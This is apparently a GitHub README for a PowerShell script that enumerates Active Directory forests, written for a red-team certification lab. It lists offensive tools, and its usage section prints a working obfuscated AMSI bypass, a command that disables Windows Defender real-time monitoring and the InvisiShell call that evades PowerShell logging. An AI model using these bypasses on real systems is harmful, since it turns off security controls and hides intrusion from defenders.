# ADRedTeamEnumScript

This AD Red Team Enumeration Script is used to query a lot of aspects of your target Forest. The script will save all output from each enumeration task into a folder separating out the output files into appropriate folders for analyze later. This script saved me a lot of time on the enumeration portion for the [Pentester Academy CRTE](https://www.pentesteracademy.com/redteamlab) exam. Will be extremely useful for any traditional AD pentesting engagement. The script contains more information within it to help you enumerate discovered resources further, so ensure you read the commented out portions! 

This script is also designed to run other popular scripts and modules intended to get the most information out of your target AD Domain. You should look into their project to understand the full capabilities of the tools besides the small task performed within this script.

* [Microsoft AD Module (Powershell)](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2019-ps)
* [Invishell](https://github.com/OmerYa/InvisiShell)
* [ADACLScan](https://github.com/canix1/ADACLScanner)
* [Find-PSServiceAccounts](https://github.com/PyroTek3/PowerShell-AD-Recon)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
* [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)
* [Rubeus](https://github.com/GhostPack/Rubeus/releases/tag/1.6.4)

## Usage

Not necessary to be an admin to run the script, but of course easier to get around most security features, heres a few tips that will help prevent the script from being blocked:

### Bypassing PowerShell Security

**To avoid verbose PowerShell logging - use [invishell](https://github.com/OmerYa/InvisiShell) (RunWithRegistryNonAdmin)**
        ```C:\PATH\TO\SCRIPTS\InviShell\RunWithRegistryNonAdmin.bat```

**AntiMalware Scan Interface (AMSI) may detect some tools when you load them. Uses the following AMSI bypass:**
```sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )```

**Stop Windows Defender (need to be admin)**
```Set-MpPreference -DisableRealTimeMonitoring $true```
                             
After which you can run the script to enumerate your target. Now we can run the script on the vitim system that in joined to your target AD domain.

1. Download the repo and rename folder as 'scripts' or whatever you choose, but you'll need to modify the ADRedTeamEnumScripts.ps1, ComputersUsersGroups.ps1, DomainInfoTrusts.ps1, DCEnum.ps1 and GPOInfo.ps1 scripts in order for everything to work correctly. This repo includes the modules and scripts you need already inside the `bin` folder.

Want to do it manually:

1. Download all the scripts/tools mention above.

2. Store them in a folder called `bin`, inside another folder called `scripts`. 

3. Add the enumeration scripts inside the folder `scripts`. As shown below:

![ADredTeamEnumScript2](https://user-images.githubusercontent.com/20993128/129828201-8302ade2-9926-4c7b-ab9f-6433b997bd09.png)

4. Run the first full script:

```.\ADRedTeamEnumScripts.ps1```

![ADredTeamEnumScript](https://user-images.githubusercontent.com/20993128/129827187-3b424d44-436d-44ad-95ed-aa2cfe0ea8c2.png)

## Author
- [@n3t1nv4d3](https://twitter.com/n3t1nv4d3) author and researcher (https://github.com/n3t1nv4d3).
- Sources for other scripts used are linked to their names up above, thanks to your work I was able to create my personalize enum script. 
